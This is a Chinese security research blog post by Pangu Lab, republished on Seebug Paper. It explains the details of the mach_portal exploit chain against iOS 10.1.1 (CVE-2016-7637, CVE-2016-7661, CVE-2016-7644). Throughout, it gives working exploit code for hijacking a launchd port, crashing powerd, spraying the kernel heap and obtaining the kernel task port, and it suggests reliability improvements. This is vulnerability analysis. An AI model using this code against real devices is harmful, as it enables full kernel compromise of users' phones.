来源： **[盘古实验室](http://blog.pangu.io/mach-portal-details/)**

作者： **[windknown@PanguTeam](http://blog.pangu.io/author/windknown/)**

前不久GP0的研究员Ian Beer公布了针对iOS
10.1.1的[漏洞细节及利用代码](https://bugs.chromium.org/p/project-zero/issues/detail?id=965#c2)，通过结合三个漏洞获取设备的root
shell。之后意大利研究员[@qwertyoruiopz](https://twitter.com/qwertyoruiopz/)在此基础上加入绕过KPP保护的漏洞利用并发布了完整的[iOS10越狱](http://yalu.qwertyoruiop.com/)。

Ian Beer已经对漏洞的成因和利用做了相关描述，这里将不再阐述，而是介绍一些利用的细节以及可能的改进建议。

整个exploit chain包含了三个漏洞：

  * CVE-2016-7637 用于替换了launchd进程中往com.apple.iohideventsystem发消息的port
  * CVE-2016-7661 造成powerd崩溃重启，从而在接管com.apple.iohideventsystem后获取powerd的task port，进而获取host_priv
  * CVE-2016-7644 导致内核port的UAF，进一步获取kernel_task

### **替换launchd中的port**

内核中的ipc_object对象对应到用户态下是一个name（int类型），每个进程的
ipc_space_t中保存了name与object之间的映射关系。相关代码可以在
ipc__entry.c中查看，ipc_entry_lookup函数将返回name对应的ipc_entry_t结构，其中保存了对应的object。name的高24位是table中的索引，而低8位是generation
number（初始值是-1，增加步长是4，因此一共有64个值）

    
    
    #define    MACH_PORT_INDEX(name)       ((name) >> 8)
    #define    MACH_PORT_GEN(name)     (((name) & 0xff) << 24)
    #define    MACH_PORT_MAKE(index, gen)  \
            (((index) << 8) | (gen) >> 24)

被释放的name会被标记到freelist的起始位置，当再创建的时候会有相同的索引号，但是generation
number会增加4，因此当被重复释放和分配64次后会返回给用户态完全相同的name，从而可以完成劫持。

    
    
    #define    IE_BITS_GEN_MASK    0xff000000  /* 8 bits for generation */
    #define    IE_BITS_GEN(bits)   ((bits) & IE_BITS_GEN_MASK)
    #define    IE_BITS_GEN_ONE     0x04000000  /* low bit of generation */
    #define IE_BITS_NEW_GEN(old)   (((old) + IE_BITS_GEN_ONE) & IE_BITS_GEN_MASK)

简单的测试代码

    
    
        for (int i=0; i<65; i++)
        {
            mach_port_t port = 0;
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
            printf("port index:0x%x gen:0x%x\n", (port >> 8), (port & 0xff));
            mach_port_destroy(mach_task_self(), port);
        }

在实际利用漏洞的时候，需要在launchd的进程空间内重用name，因此可以发送一个launchd接受的id的消息，就能完成一次分配和释放（send_looper函数）。为了避免name释放后被抢占，首先调用了一次send_looper将要占用的name移动到freelist的末端相对安全的位置，进而再次调用62次来递增generation
number，最后一次通过注册服务抢占name，完成了中间人劫持。

    
    
        // send one smaller looper message to push the free'd name down the free list:
        send_looper(bootstrap_port, ports, 0x100, MACH_MSG_TYPE_MAKE_SEND);
    
        // send the larger ones to loop the generation number whilst leaving the name in the middle of the long freelist
        for (int i = 0; i < 62; i++) {
            send_looper(bootstrap_port, ports, 0x200, MACH_MSG_TYPE_MAKE_SEND);
        }
    
        // now that the name should have looped round (and still be near the middle of the freelist
        // try to replace it by registering a lot of new services
        for (int i = 0; i < n_ports; i++) {
            kern_return_t err = bootstrap_register(bootstrap_port, names[i], ports[i]);
            if (err != KERN_SUCCESS) {
                printf("failed to register service %d, continuing anyway...\n", i);
            }
        }

### **使powerd崩溃**

powerd在接收到MACH_NOTIFY_DEAD_NAME消息后没有检查发送者及port，就直接调用mach_port_deallocate去释放。利用代码中将被释放的port设置为0x103，该port应该是本进程的task
port，一旦被释放后任何的内存分配处理都会直接出错。代码如下

    
    
        mach_port_t service_port = lookup("com.apple.PowerManagement.control");
    
        // free task_self in powerd
        for (int j = 0; j < 2; j++) {
            spoof(service_port, 0x103);
        }
    
        // call _io_ps_copy_powersources_info which has an unchecked vm_allocate which will fail
        // and deref an invalid pointer
    
        vm_address_t buffer = 0;
        vm_size_t size = 0;
        int return_code;
    
        io_ps_copy_powersources_info(service_port,
                                     0,
                                     &buffer,
                                     (mach_msg_type_number_t *) &size,
                                     &return_code);

在测试过程中发现有的设备的mach_task_self()返回的并不是0x103，因此可以增加循环处理的代码来加强利用的适应性。

    
    
        // free task_self in powerd
        for (int port = 0x103; port < 0x1003; port += 4) {
            for (int j = 0; j < 2; j++) {
                spoof(service_port, port);
            }
        }

### **内核堆跨Zone攻击**

CVE-2016-7644可以通过race造成内核port对象的UAF，因此第一步需要在port对象被释放后重新去填充。由于所有的port都被分配在特殊的”ipc
ports”的zone里，无法使用常见的分配kalloc
zone的方式来直接填充内存。因此利用代码首先分配大量port然后释放，再调用mach_zone_force_gc将这些页面释放掉，此后可以在通过kalloc
zone里spray内存来占用。

port对象的大小是0xA8（64位），其中ip_context成员（0x90偏移）可以通过用户态API读写的，Ian
Beer选择了一种比较巧妙的方式来填充port对象。

首先需要了解mach msg中对MACH_MSG_OOL_PORTS_DESCRIPTOR的处理，内核收到复杂消息后发现是port
descriptor后会交给ipc_kmsg_copyin_ool_ports_descriptor函数读入所有的port对象。该函数会调用kalloc分配需要的内存（64位下分配的内存是输入的2倍，name长度是4字节），然后将有效的port由name转换成真实对象地址保存，对于输入是0的name任然会填充0。

    
    
        /* calculate length of data in bytes, rounding up */
        ports_length = count * sizeof(mach_port_t);
        names_length = count * sizeof(mach_port_name_t);
    
        ...
    
        data = kalloc(ports_length);
    
        ...
    
    #ifdef __LP64__
        mach_port_name_t *names = &((mach_port_name_t *)data)[count];
    #else
        mach_port_name_t *names = ((mach_port_name_t *)data);
    #endif
    
        if (copyinmap(map, addr, names, names_length) != KERN_SUCCESS) {
            ...
        }
    
        objects = (ipc_object_t *) data;
        dsc->address = data;
    
        for ( i = 0; i < count; i++) {
            mach_port_name_t name = names[i];
            ipc_object_t object;
    
            if (!MACH_PORT_VALID(name)) {
                objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);
                continue;
            }
    
            kern_return_t kr = ipc_object_copyin(space, name, user_disp, &object);
    
            ...
    
            objects[i] = object;
        }

如果我们将输入ool
port数据的恰当位置的name设置为之前获取的host_priv，那么在内核处理后，host_priv对应的内核object地址会被保存在UAF的port的ip_context成员位置，从而在用户态就可以读取到HOST_PRIV_PORT这个port的真实地址。用于填充内存的代码在send_ool_ports函数，每个descriptor会分配一个kalloc.4096(0x200*8)，一个消息会在内核分配1000个4KB的页面。

    
    
        size_t n_ports = 0x200;
        mach_port_t* ports = calloc(sizeof(mach_port_t), n_ports);
        uint32_t obj_offset = 0x90;
        for (int i = 0; i < n_ports_in_zone; i++) {
            uint32_t index = (obj_offset & 0xfff) / 8;
            ports[index] = to_send;
            obj_offset += 0xa8;
        }
    
        // build a message with those ool ports:
        struct ool_multi_msg* leak_msg = malloc(sizeof(struct ool_multi_msg));
        memset(leak_msg, 0, sizeof(struct ool_msg));
    
        leak_msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        leak_msg->hdr.msgh_size = sizeof(struct ool_msg);
        leak_msg->hdr.msgh_remote_port = q;
        leak_msg->hdr.msgh_local_port = MACH_PORT_NULL;
        leak_msg->hdr.msgh_id = 0x41414141;
    
        leak_msg->body.msgh_descriptor_count = 1000;
    
        for (int i = 0; i < 1000; i++) {
            leak_msg->ool_ports[i].address = ports;
            leak_msg->ool_ports[i].count = n_ports;
            leak_msg->ool_ports[i].deallocate = 0;
            leak_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
            leak_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
            leak_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
        }

成功填充被释放的port后，即可以读取context的值。

    
    
        // get the target page reused by the ool port pointers
        for (int i = 0; i < n_ool_port_qs; i++) {
            ool_port_qs[i] = send_ool_ports(host_priv);
        }
    
        uint64_t context = 123;
        mach_port_get_context(mach_task_self(), middle_ports[0], &context);
        printf("read context value: 0x%llx\n", context);

### **获取kernel task port**

HOST_PRIV_PORT这个port是在系统初始化函数kernel_bootstrap里的调用ipc_init创建的，而kernel task
port在之后的task_init中创建，因此很大概率这两个port对象在比较接近的内存位置。

    
    
    void
    kernel_bootstrap(void)
    {
        ...
    
        kernel_bootstrap_log("ipc_init");
        ipc_init();
    
        kernel_bootstrap_log("PMAP_ACTIVATE_KERNEL");
        PMAP_ACTIVATE_KERNEL(master_cpu);
    
        kernel_bootstrap_log("mapping_free_prime");
        mapping_free_prime();                       /* Load up with temporary mapping blocks */
    
        kernel_bootstrap_log("machine_init");
        machine_init();
    
        kernel_bootstrap_log("clock_init");
        clock_init();
    
        ledger_init();
    
        kernel_bootstrap_log("task_init");
        task_init();
    
        ...
    }

上文提到kernel接收MACH_MSG_OOL_PORTS_DESCRIPTOR时候的copyin处理，同样在把消息还给用户态时有copyout的处理，会将真实的port对象地址转换成name还给用户态。可以将UAF的port的context设置成HOST_PRIV_PORT地址附近的port地址，用户态获取name后通过pid_for_task检查是否成功获取kernel
task的port。receive_ool_ports函数接收之前发送填充的消息，并检查返回值找到可能的kernel task port。

    
    
        struct ool_multi_msg_rcv msg = {0};
        err = mach_msg(&msg.hdr,
                       MACH_RCV_MSG,
                       0,
                       sizeof(struct ool_multi_msg_rcv),
                       q,
                       0,
                       0);
        if (err != KERN_SUCCESS) {
            printf("failed to receive ool ports msg (%s)\n", mach_error_string(err));
            exit(EXIT_FAILURE);
        }
    
        mach_port_t interesting_port = MACH_PORT_NULL;
        mach_port_t kernel_task_port = MACH_PORT_NULL;
    
        for (int i = 0; i < 1000; i++) {
            mach_msg_ool_ports_descriptor_t* ool_desc = &msg.ool_ports[i];
            mach_port_t* ool_ports = (mach_port_t*)ool_desc->address;
            for (size_t j = 0; j < ool_desc->count; j++) {
                mach_port_t port = ool_ports[j];
                if (port == expected) {
                    ;
                } else if (port != MACH_PORT_NULL) {
                    interesting_port = port;
                    printf("found an interesting port 0x%x\n", port);
                    if (kernel_task_port == MACH_PORT_NULL &&
                        is_port_kernel_task_port(interesting_port, valid_kernel_pointer))
                    {
                        kernel_task_port = interesting_port;
                    }
                }
            }
            mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)ool_desc->address, ((ool_desc->count*4)+0xfff)&~0xfff);
        }

利用代码中准备了0x20个UAF的port，然后从HOST_PRIV_PORT地址所在的zone的页面的中间部分开始猜测。

    
    
        for (int i = 0; i < n_middle_ports; i++) {
            // guess the middle slots in the zone block:
            mach_port_set_context(mach_task_self(), middle_ports[i], pages_base+(0xa8 * ((n_ports_in_zone/2) - (n_middle_ports/2) + i)));
        }
    
        mach_port_t kernel_task_port = MACH_PORT_NULL;
        for (int i = 0; i < n_ool_port_qs; i++) {
            mach_port_t new_port = receive_ool_ports(ool_port_qs[i], host_priv, pages_base);
            if (new_port != MACH_PORT_NULL) {
                kernel_task_port = new_port;
            }
        }

增加准备的UAF的port的数量（最多可增加至port的zone的页面的容量）可以提高命中率。此外上述代码的一处改进是在接收消息前再分配一些port，由于HOST_PRIV_PORT所在的zone的页面可能存在被释放了的port地址，在copyout时候会导致panic，因此填补这些空洞可以提高稳定性。

### **设备差异性**

iOS的内核堆是由zone来管理的，具体代码可以在zalloc.c中查看。每个zone对应的页面大小计算在zinit函数中，其中
ZONE_MAX_ALLOC_SIZE 固定为0x8000。

    
    
        if (alloc == 0)
            alloc = PAGE_SIZE;
    
        alloc = round_page(alloc);
        max   = round_page(max);
    
        vm_size_t best_alloc = PAGE_SIZE;
        vm_size_t alloc_size;
        for (alloc_size = (2 * PAGE_SIZE); alloc_size <= ZONE_MAX_ALLOC_SIZE; alloc_size += PAGE_SIZE) {
            if (ZONE_ALLOC_FRAG_PERCENT(alloc_size, size) < ZONE_ALLOC_FRAG_PERCENT(best_alloc, size)) {
                best_alloc = alloc_size;
            }
        }
        alloc = best_alloc;

值得注意的是PAGE_SIZE在iOS下可能是0x1000或0x4000，通过观察PAGE_SHIFT_CONST的初始化可以知道当RAM大于1GB（0x40000000）的时候PAGE_SIZE=0x4000，否则PAGE_SIZE=0x1000

    
    
      if ( v139 )
      {
        v14 = 14;
        if ( *(_QWORD *)(a1 + 24) <= 0x40000000uLL )
          v15 = 12;
        else
          v15 = 14;
      }
      else
      {
        if ( (unsigned int)sub_FFFFFFF0074F2BE4("-use_hwpagesize", &v142, 4, 0) )
          v15 = 12;
        else
          v15 = 14;
        v14 = v15;
      }
      PAGE_SHIFT_CONST = v15;

iPhone 6s及之后的设备内存都是2GB，对应内核中的最小页面单位是16KB。根据zinit中的计算，ipc ports
zone的页面大小是0x3000（6s之前的设备）或者0x4000（6s及之后的设备）。因此要猜测完整个页面的port需要0x49或者0x61个UAF的port。利用代码中的platform_detection也可以修改如下

    
    
    void platform_detection() {
        uint32_t hwmem = 0;
        size_t hwmem_size = 4;
        sysctlbyname("hw.memsize", &hwmem, &hwmem_size, NULL, 0);
        printf("hw memory is 0x%x bytes\n", hwmem);
        if (hwmem > 0x40000000)
            n_ports_in_zone = 0x4000/0xa8;
        else
            n_ports_in_zone = 0x3000/0xa8;
    }

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/174/>

